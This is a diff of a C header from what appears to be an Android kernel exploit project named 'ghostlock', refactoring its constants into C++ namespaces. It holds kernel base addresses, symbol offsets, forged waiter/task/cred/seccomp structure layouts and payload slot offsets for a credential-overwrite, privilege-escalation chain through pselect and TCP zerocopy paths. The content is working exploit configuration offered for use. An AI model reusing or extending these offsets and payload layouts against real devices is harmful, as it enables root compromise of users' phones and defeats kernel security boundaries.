@@ -1,21 +1,51 @@
 #ifndef TARGET_H
 #define TARGET_H
 
+#include "target_constants.hpp"
+
 #define BUILD_VARIANT_LABEL "ghostlock_oplus"
 
+/* Compatibility façade for the translation units that still read C-style
+ * macros. `target_constants.hpp` owns the stable address-domain and
+ * payload-slot values for C++ code; everything below is a retained default or
+ * fallback, not a second authority:
+ *
+ *   - device/profile defaults (`P0_KERNEL_PHYS_LOAD`, `QC_GKI_6_12_PHYS_LOAD`,
+ *     `XRING_KERNEL_PHYS_LOAD`): delete in CPP08/CPP12, once RuntimeConfig owns
+ *     the startup fallback and ExploitSession is the only entry point.
+ *   - symbol/slide and fake-layout offsets: fallbacks for the `_RSO`
+ *     accessors in `runtime_struct_offsets.h`. They are still reachable when a
+ *     resolved profile carries zero for an unchecked field, so they are deleted
+ *     in CPP08 only after profile validation forces every symbol field nonzero.
+ *   - payload slots already forwarded from `target_constants.hpp`
+ *     (`LOCK_OFF`, `W0_OFF`, `FOPS_OFF`, `RIGHT_OFF`, `LEFT_OFF`,
+ *     `FAKE_TASK_OFF`, `CRED_COPY_OFF`, `TCP_*`): keep this C-compatible
+ *     spelling until CPP05/CPP13 replace the remaining payload readers.
+ *   - kernel structure layout offsets (`FAKE_WAITER_*`, `TASK_*`, `CRED_*`,
+ *     `SECCOMP_*`, `STRUCT_*`): move into the payload/kernel layout constant
+ *     namespace in CPP05/CPP13.
+ *
+ * `tests/target_constants_test.cpp` pins every value so an accidental change
+ * is caught before it can alter the payload bytes.
+ */
+
 /* Kernel address layout. */
-#define KIMAGE_TEXT_BASE 0xffffffc080000000ULL
-#define MTK_VADDR_BASE 0xffffffc000000000ULL
-#define P0_PAGE_OFFSET 0xffffff8000000000ULL
-#define P0_PHYS_OFFSET 0x80000000ULL
+#define KIMAGE_TEXT_BASE (::ghostlock::target::address::kImageTextBase)
+#define MTK_VADDR_BASE (::ghostlock::target::address::kMtkVirtualBase)
+#define P0_PAGE_OFFSET (::ghostlock::target::address::kPageOffset)
+#define P0_PHYS_OFFSET (::ghostlock::target::address::kPhysicalOffset)
+#define KERNELSNITCH_IDENTITY_START \
+  (::ghostlock::target::address::kKernelSnitchIdentityStart)
+#define KERNELSNITCH_IDENTITY_END \
+  (::ghostlock::target::address::kKernelSnitchIdentityEnd)
+#define DIRECT_MAP_BASE (::ghostlock::target::address::kDirectMapBase)
+#define DIRECT_MAP_END (::ghostlock::target::address::kDirectMapEnd)
+#define VMEMMAP_START (::ghostlock::target::address::kVmemmapStart)
+
+/* Device/profile defaults remain in the C compatibility layer. */
 #define P0_KERNEL_PHYS_LOAD 0xa8000000ULL
 #define QC_GKI_6_12_PHYS_LOAD 0xc7800000ULL
 #define XRING_KERNEL_PHYS_LOAD 0x80200000ULL
-#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
-#define KERNELSNITCH_IDENTITY_END 0xffffff8c00000000ULL
-#define DIRECT_MAP_BASE 0xffffff8000000000ULL
-#define DIRECT_MAP_END (DIRECT_MAP_BASE + (64ULL << 30))
-#define VMEMMAP_START 0xfffffffe00000000ULL
 
 /* Symbol offsets. */
 #define INIT_TASK_OFF 0x0211e280ULL
@@ -45,7 +75,7 @@
 #define SLIDE_ROOT_TASK_GROUP_IMAGE (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
 #define SLIDE_SYSCTL_BOOTID_IMAGE (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)
 
-#define PSELECT_WAITER_WORD_SHIFT -2
+#define PSELECT_WAITER_WORD_SHIFT (-2)
 
 /* Fake waiter and task layouts. */
 #define FAKE_WAITER_TREE_PRIO_OFF 0x18
@@ -95,20 +125,21 @@
 #define STRUCT_SLAB_CACHE_OFF 0x08
 #define STRUCT_PAGE_TYPE_OFF 0x30
 
-#define LOCK_OFF 0x0E80
-#define W0_OFF 0x1180
-#define FOPS_OFF 0x0F80
-#define RIGHT_OFF 0x1240
-#define LEFT_OFF 0x1260
-#define FAKE_TASK_OFF 0x1280
+#define LOCK_OFF (::ghostlock::target::payload::kLockOffset)
+#define W0_OFF (::ghostlock::target::payload::kWaiterOffset)
+#define FOPS_OFF (::ghostlock::target::payload::kFileOperationsOffset)
+#define RIGHT_OFF (::ghostlock::target::payload::kRightNodeOffset)
+#define LEFT_OFF (::ghostlock::target::payload::kLeftNodeOffset)
+#define FAKE_TASK_OFF (::ghostlock::target::payload::kFakeTaskOffset)
 
 /* W2 payload. */
-#define CRED_COPY_OFF 0x1080
+#define CRED_COPY_OFF (::ghostlock::target::payload::kCredentialCopyOffset)
 
 /* TCP zerocopy payload offsets: fake_task sits at 0x5800 so it clears the
  * fake_lock rb_leftmost zone; the cred copy follows because the pselect
  * 0x1080 slot would land inside fake_task. */
-#define TCP_FAKE_TASK_OFF 0x5800
-#define TCP_CRED_COPY_OFF 0x6800
+#define TCP_FAKE_TASK_OFF (::ghostlock::target::payload::kTcpFakeTaskOffset)
+#define TCP_CRED_COPY_OFF \
+  (::ghostlock::target::payload::kTcpCredentialCopyOffset)
 
 #endif
